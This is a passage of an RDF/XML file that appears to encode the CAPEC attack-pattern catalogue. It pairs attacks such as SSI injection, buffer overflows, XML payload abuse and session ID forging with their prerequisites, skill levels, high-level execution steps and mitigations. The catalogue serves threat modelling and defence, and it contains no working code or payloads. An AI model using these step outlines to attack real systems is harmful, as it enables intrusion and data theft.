    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Given a vulnerable phone system  the attackers&apos; technical vector relies on attacks that are well documented in cracker &apos;zines and have been around for decades.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::CCITT-5 or other vulnerable lines  with the ability to send tones such as combined 2 400 Hz and 2 600 Hz tones to the switch::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker230">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#101">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:253::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Server Side Include (SSI) Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack230">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#101"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::97::74::20::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine applicability) The attacker determines whether server side includes are enabled on the target web server.TECHNIQUE:Look for popular page file names. The attacker will look for .shtml  .shtm  .asp  .aspx  and other well-known strings in URLs to help determine whether SSI functionality is enabled.:TECHNIQUE:Fetch .htaccess file. In Apache web server installations  the .htaccess file may enable server side includes in specific locations. In those cases  the .htaccess file lives inside the directory where SSI is enabled  and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file  a misconfigured server will allow it. Thus  an attacker will frequently try it.::STEP:2:PHASE:Explore:DESCRIPTION:(Attempt SSI) Look for user controllable input  including HTTP headers  that can carry server side include directives to the web server.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.::STEP:3:PHASE:Explore:DESCRIPTION:(Inject SSI) The attacker may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the attacker::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::97::74::20::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A web server that supports server side includes and has them enabled::User controllable input that can carry include directives to the web server::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs to be aware of SSI technology  determine the nature of injection and be able to craft input that results in the SSI directives being executed.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools  and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Typically  an IDS/IPS system is very effective against this type of attack.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack160">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#307">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#TCP RPC Scan"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Verify that the user-supplied data does not use backslash character to escape malicious characters.::Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.::Be aware of the threat of alternative method of data encoding.::Regular expressions can be used to filter out backslash. Make sure you decode before filtering and validating the untrusted input data.::In the case of path traversals  use the principle of least privilege when determining access rights to file systems. Do not allow users to access directories/files that they should not access.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process  if bad character are left after decoding process  treat the data as suspicious  and fail the validation process.::Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack473">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#78">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Using Escaped Slashes in Alternate Encoding"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::180::181::173::171::172::73::21::22::74::20::697::707::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:The attacker can send input data to the host target (e.g.  via http request or command line request::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker craft malicious input data which includes escaped slashes. The attacker may need multiple attempts before finding a successful combination.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize  filter and sanitize all user supplied fields.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack437">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#245">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XSS Using Doubled Characters"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::85::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configure the XML processor to only retrieve external entities from trusted sources.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack237"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker495">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#38">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:159::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Leveraging/Manipulating Configuration File Search Paths"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack495">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#38"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::426::427::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::426::427::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to write to redirect search paths on the victim host.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker362">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#231">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Oversized Payloads"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack362">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#231"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::112::20::19::674::770::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by an XML parser on the victim&apos;s side.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim&apos;s system.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::112::20::19::674::770::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application uses an XML parser to perform transformation on user-controllable data.::An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Denial of service:LEVEL:Low::SKILL:Arbitrary code execution:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker360">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#520"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack360"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.::"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Resources to maliciously construct components used by the manufacturer.:LEVEL:High::SKILL:Resources to physically infiltrate manufacturer or manufacturer&apos;s supplier.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker361">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#230">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Nested Payloads"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack361">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#230"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::112::20::19::674::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by an XML parser on the victim&apos;s side.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim&apos;s system.::"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::112::20::19::674::770::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::An application uses an XML parser to perform transformation on user-controllable data.::An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Denial of service:LEVEL:Low::SKILL:Arbitrary code execution:LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of attack  physical security techniques such as locks doors  alarms  and monitoring of targets should be implemented.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack106"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker494">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#295"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack494"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send a timestamp request to a remote target and receive a response.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Scanners or utilities that provide the ability to send custom ICMP queries.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.::Leverage anti-virus products to detect and quarantine software with known virus.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack75">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#445">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Logic Insertion into Product Software via Configuration Management Manipulation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker492">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#555">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:560::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Remote Services with Stolen Credentials"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack492">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#555"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::522::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::522::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Carefully validate and sanitize all user-controllable data prior to passing it to the XML parser routine. Ensure that the resultant data is safe to pass to the XML parser.::Perform validation on canonical data.::Pick a robust implementation of an XML parser.::Validate XML against a valid schema or DTD prior to parsing.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack362"/>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack361"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker493">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#12">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:PeerOf:CAPEC ID:21::NATURE:ChildOf:CAPEC ID:216::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Choosing Message Identifier"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack493">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#12"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::201::306::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine the nature of messages being transported as well as the identifiers to be used as part of the attack::STEP:2:PHASE:Experiment:DESCRIPTION:If required  authenticate to the distribution channel::STEP:3:PHASE:Experiment:DESCRIPTION:If any particular client&apos;s information is available through the transport means simply by selecting a particular identifier  an attacker can simply provide that particular identifier.::STEP:4:PHASE:Experiment:DESCRIPTION:Attackers with client access connecting to output channels could change their channel identifier and see someone else&apos;s (perhaps more privileged) data.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::306::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.::Distribution means must code (through channel  message identifiers  or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:All the attacker needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The Attacker needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker367">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#100">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:123::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Overflow Buffers"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack367">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#100"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::120::119::131::129::805::19::680::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The adversary identifies a buffer to target. Buffer regions are either allotted on the stack or the heap  and the exact nature of attack would vary depending on the location of the buffer::STEP:2:PHASE:Explore:DESCRIPTION:Next  the adversary identifies an injection vector to deliver the excessive content to the targeted buffer.::STEP:3:PHASE:Experiment:DESCRIPTION:The adversary crafts the content to be injected. If the intent is to simply cause the software to crash  the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code  the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries&apos; choosing which points to code injected by the adversary.::STEP:4:PHASE:Exploit:DESCRIPTION:The adversary injects the content into the targeted software.::STEP:5:PHASE:Exploit:DESCRIPTION:Upon successful exploitation  the system either crashes or control of the program is returned to a location of the adversaries&apos; choice. This can result in execution of arbitrary code or escalated privileges  depending upon the exploited target.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::119::131::129::805::19::680::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Targeted software performs buffer operations.::Targeted software inadequately performs bounds-checking on buffer operations.::Adversary has the capability to influence the input to buffer operations.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:In most cases  overflowing a buffer does not require advanced skills beyond the ability to notice an overflow and stuff an input variable with content.:LEVEL:Low::SKILL:In cases of directed overflows  where the motive is to divert the flow of the program or application as per the adversaries&apos; bidding  high level skills are required. This may involve detailed knowledge of the target system architecture and kernel.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack. Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker234">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#196">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:CanPrecede:CAPEC ID:384::NATURE:CanPrecede:CAPEC ID:61::NATURE:ChildOf:CAPEC ID:21::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Session Credential Falsification through Forging"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack234">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#196"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::384::664::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Analyze and Understand Session IDs) The attacker finds that the targeted application use session credentials to identify legitimate users.TECHNIQUE:An attacker makes many anonymous connections and records the session IDs.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:(Create Session IDs.) Attackers craft messages containing their forged credentials in GET  POST request  HTTP headers or cookies.TECHNIQUE:The attacker manipulates the HTTP request message and adds his forged session IDs in to the requests or cookies.::STEP:3:PHASE:Exploit:DESCRIPTION:(Abuse the Victim&apos;s Session Credentials) The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege  possibly by logging into the application  the attacker can now take over the session using the forged session identifier.TECHNIQUE:The attacker loads the predefined or predicted session ID into his browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined or predicted session ID into his software and utilizes functionality with the rights of the victim.::"/>
        </j.0:executes>
